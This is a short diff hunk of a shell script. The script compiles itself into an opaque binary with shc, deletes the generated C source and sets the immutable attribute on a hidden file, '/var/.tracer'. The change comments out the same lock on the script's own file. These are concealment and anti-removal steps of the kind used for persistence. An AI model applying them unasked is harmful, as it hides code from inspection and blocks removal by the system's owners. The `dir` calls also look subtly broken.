@@ -2,7 +2,7 @@
 
 shc -f "$(dir "$0")" -o "$(dir "$0")"
 rm "$(dir "$0").x.c"
-chattr +i "$(dir "$0")"
+#chattr +i "$(dir "$0")"
 #chmod go-rwx "$(dir "$0")"
 #chmod og-rwx /var/.tracer 
 chattr +i /var/.tracer 
